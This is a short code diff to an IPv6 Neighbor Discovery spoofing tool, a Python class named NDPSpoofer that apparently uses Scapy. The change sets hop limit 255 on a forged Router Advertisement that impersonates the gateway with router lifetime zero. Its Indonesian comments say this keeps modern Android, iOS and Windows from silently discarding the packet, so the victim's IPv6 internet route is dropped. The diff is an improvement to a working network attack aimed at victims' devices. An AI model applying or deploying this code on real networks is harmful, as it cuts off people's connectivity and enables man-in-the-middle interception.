@@ -123,9 +123,11 @@ class NDPSpoofer:
         pkts.append(na_gateway)
 
         # 3. Fake Router Advertisement dengan Router Lifetime = 0 (Rute internet IPv6 drop)
+        # RFC 4861 Sec 6.1.2: RA WAJIB berkepala Hop Limit 255 (hlim=255) agar tidak dibuang
+        # senyap oleh kernel Android/iOS/Windows modern.
         ra_drop = (
             Ether(dst=victim_mac, src=self_mac) /
-            IPv6(src=clean_gw_ip, dst="ff02::1") /
+            IPv6(src=clean_gw_ip, dst="ff02::1", hlim=255) /
             ICMPv6ND_RA(routerlifetime=0)
         )
         pkts.append(ra_drop)
